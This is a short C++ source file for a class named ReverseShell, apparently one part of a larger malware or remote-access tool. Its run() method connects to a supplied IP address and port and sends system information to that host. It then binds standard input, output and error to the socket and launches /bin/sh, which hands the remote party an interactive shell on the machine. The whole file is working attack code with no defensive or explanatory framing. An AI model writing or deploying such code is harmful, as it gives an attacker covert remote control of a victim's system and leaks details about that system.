#include "ReverseShell.h"
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <iostream>

ReverseShell::ReverseShell(const std::string& ip, int port)
    : conn(ip, port), sysInfo(conn) {}

void ReverseShell::run() {
    if (conn.establish()) {
        sysInfo.sendSystemInfo();

        int sockfd = conn.getSocketFd(); 
        dup2(sockfd, 0); 
        dup2(sockfd, 1); 
        dup2(sockfd, 2); 

        execl("/bin/sh", "sh", nullptr);
    }
}
